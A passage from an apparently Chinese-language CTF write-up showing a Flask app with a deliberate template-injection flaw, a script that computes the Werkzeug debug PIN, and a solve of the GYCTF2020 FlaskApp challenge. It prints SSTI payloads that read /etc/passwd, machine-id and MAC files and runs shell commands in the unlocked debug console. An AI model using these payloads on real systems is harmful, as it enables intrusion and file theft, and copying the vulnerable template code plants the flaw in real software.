+</span></span></code></pre></td></tr></table></div></div><p>实验代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>request</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>render_template_string</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>=</span><span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>         
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>template</span><span class=o>=</span><span class=s1>&#39;&#39;&#39; 
+</span></span></span><span class=line><span class=cl><span class=s1>    &lt;p&gt;Hello </span><span class=si>%s</span><span class=s1> &lt;/p&gt;&#39;&#39;&#39;</span><span class=o>%</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>template</span><span class=p>)</span>      <span class=c1># 渲染为html内容</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>          <span class=c1># 如果作为脚本运行，而不是被当成模块导入</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=mf>0.0.0.0</span><span class=p>,</span><span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>由于我的Windows系统不能实验这里就贴个代码吧看题</p><h2 id=计算脚本>计算脚本</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>chain</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getMd5Pin</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>chain</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>bit</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>bit</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>bit</span> <span class=o>=</span> <span class=n>bit</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;cookiesalt&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;pinsalt&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;</span><span class=si>%09d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>))[:</span><span class=mi>9</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>rv</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rv</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>group_size</span> <span class=ow>in</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>%</span> <span class=n>group_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>rv</span> <span class=o>=</span> <span class=s1>&#39;-&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>num</span><span class=p>[</span><span class=n>x</span><span class=p>:</span><span class=n>x</span> <span class=o>+</span> <span class=n>group_size</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>group_size</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                              <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>),</span> <span class=n>group_size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>rv</span> <span class=o>=</span> <span class=n>num</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>rv</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getSha1Pin</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>chain</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>bit</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>bit</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>bit</span> <span class=o>=</span> <span class=n>bit</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;cookiesalt&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;pinsalt&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span><span class=si>:</span><span class=s2>09d</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>[:</span><span class=mi>9</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>rv</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rv</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>group_size</span> <span class=ow>in</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>%</span> <span class=n>group_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>rv</span> <span class=o>=</span> <span class=s2>&#34;-&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                    <span class=n>num</span><span class=p>[</span><span class=n>x</span><span class=p>:</span> <span class=n>x</span> <span class=o>+</span> <span class=n>group_size</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>group_size</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>),</span> <span class=n>group_size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>rv</span> <span class=o>=</span> <span class=n>num</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>rv</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>macToInt</span><span class=p>(</span><span class=n>mac</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>mac</span> <span class=o>=</span> <span class=n>mac</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>mac</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span> <span class=o>=</span> <span class=s2>&#34;Calculate Python Flask Pin&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-u&#39;</span><span class=p>,</span> <span class=s1>&#39;--username&#39;</span><span class=p>,</span><span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&#34;运行flask用户的用户名&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-m&#39;</span><span class=p>,</span> <span class=s1>&#39;--modname&#39;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>default</span> <span class=o>=</span> <span class=s2>&#34;flask.app&#34;</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&#34;默认为flask.app&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-a&#39;</span><span class=p>,</span> <span class=s1>&#39;--appname&#39;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>default</span> <span class=o>=</span> <span class=s2>&#34;Flask&#34;</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&#34;默认为Flask&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-p&#39;</span><span class=p>,</span> <span class=s1>&#39;--path&#39;</span><span class=p>,</span> <span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&#34;getattr(mod, &#39;__file__&#39;, None):flask包中app.py的路径&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-M&#39;</span><span class=p>,</span> <span class=s1>&#39;--MAC&#39;</span><span class=p>,</span> <span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&#34;MAC地址&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parse</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-i&#39;</span><span class=p>,</span> <span class=s1>&#39;--machineId&#39;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>default</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&#34;机器ID&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parse</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>probably_public_bits</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=n>args</span><span class=o>.</span><span class=n>username</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>args</span><span class=o>.</span><span class=n>modname</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>args</span><span class=o>.</span><span class=n>appname</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>args</span><span class=o>.</span><span class=n>path</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>private_bits</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=n>macToInt</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>MAC</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=nb>bytes</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>machineId</span><span class=p>,</span> <span class=n>encoding</span> <span class=o>=</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>md5Pin</span> <span class=o>=</span> <span class=n>getMd5Pin</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sha1Pin</span> <span class=o>=</span> <span class=n>getSha1Pin</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Md5Pin:  &#34;</span> <span class=o>+</span> <span class=n>md5Pin</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Sha1Pin:  &#34;</span> <span class=o>+</span> <span class=n>sha1Pin</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=c1>#python &#34;c:\Users\xxx\Documents\VSCODE\.vscode\python\index.py&#34; -u flaskweb -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 92:8a:43:bb:5b:c3 -i 1408f836b0ca514d796cbf8960e45fa1</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=demo1>demo1</h2><p>[GYCTF2020]FlaskApp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;,&#39;r&#39;).read()}}{%endif %}{%endfor %}
+</span></span><span class=line><span class=cl>加密打入
+</span></span><span class=line><span class=cl>得到flaskweb
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flask.app
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Flask
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;,&#39;r&#39;).read()}}{%endif %}{%endfor %}
+</span></span><span class=line><span class=cl>直接打入得到
+</span></span><span class=line><span class=cl>/usr/local/lib/python3.7/site-packages/flask/app.py
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/sys/class/net/eth0/address&#39;,&#39;r&#39;).read()}}{% endif %}{% endfor %}
+</span></span><span class=line><span class=cl>加密打入得到
+</span></span><span class=line><span class=cl>92:8a:43:bb:5b:c3
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>首先访问`/etc/machine-id`，有值就break，没值就访问`/proc/sys/kernel/random/boot_id`，然后不管此时有没有值，再访问`/proc/self/cgroup` 或 `/proc/self/mountinfo` 或 `/proc/self/cpuset` 其中的值拼接到前面的值后面。
+</span></span><span class=line><span class=cl>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/machine-id&#39;,&#39;r&#39;).read()}}{% endif %}{% endfor %}
+</span></span><span class=line><span class=cl>加密打入
+</span></span><span class=line><span class=cl>1408f836b0ca514d796cbf8960e45fa1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc/self/cgroup&#39;,&#39;r&#39;).read()}}{% endif %}{% endfor %}
+</span></span><span class=line><span class=cl>加密打入
+</span></span><span class=line><span class=cl>0::/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python &#34;c:\Users\baozhongqi\Documents\VSCODE\.vscode\python\index.py&#34; -u flaskweb -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 92:8a:43:bb:5b:c3 -i 1408f836b0ca514d796cbf8960e45fa1
+</span></span><span class=line><span class=cl>Md5Pin:  462-301-547
+</span></span><span class=line><span class=cl>Sha1Pin:  468-724-479
+</span></span></code></pre></td></tr></table></div></div><p>这里是<code>python3.7</code>所以使用<code>md5</code></p><p>终于打通了 <code>/console</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>import</span> <span class=n>os</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;ls /&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>os</span><span class=o>.</span><span class=n>_wrap_close</span> <span class=n>object</span> <span class=n>at</span> <span class=mh>0x7fad121fa910</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;ls /&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=s1>&#39;app</span><span class=se>\n</span><span class=s1>bin</span><span class=se>\n</span><span class=s1>boot</span><span class=se>\n</span><span class=s1>dev</span><span class=se>\n</span><span class=s1>etc</span><span class=se>\n</span><span class=s1>home</span><span class=se>\n</span><span class=s1>lib</span><span class=se>\n</span><span class=s1>lib64</span><span class=se>\n</span><span class=s1>media</span><span class=se>\n</span><span class=s1>mnt</span><span class=se>\n</span><span class=s1>opt</span><span class=se>\n</span><span class=s1>proc</span><span class=se>\n</span><span class=s1>ro  </span>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;ls /&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>app</span>
+</span></span><span class=line><span class=cl><span class=n>bin</span>
+</span></span><span class=line><span class=cl><span class=n>boot</span>
+</span></span><span class=line><span class=cl><span class=n>dev</span>
+</span></span><span class=line><span class=cl><span class=n>etc</span>
+</span></span><span class=line><span class=cl><span class=n>home</span>
+</span></span><span class=line><span class=cl><span class=n>lib</span>
+</span></span><span class=line><span class=cl><span class=n>lib64</span>
+</span></span><span class=line><span class=cl><span class=n>media</span>
+</span></span><span class=line><span class=cl><span class=n>mnt</span>
+</span></span><span class=line><span class=cl><span class=n>opt</span>
+</span></span><span class=line><span class=cl><span class=n>proc</span>
+</span></span><span class=line><span class=cl><span class=n>root</span>
+</span></span><span class=line><span class=cl><span class=n>run</span>
+</span></span><span class=line><span class=cl><span class=n>sbin</span>
+</span></span><span class=line><span class=cl><span class=n>srv</span>
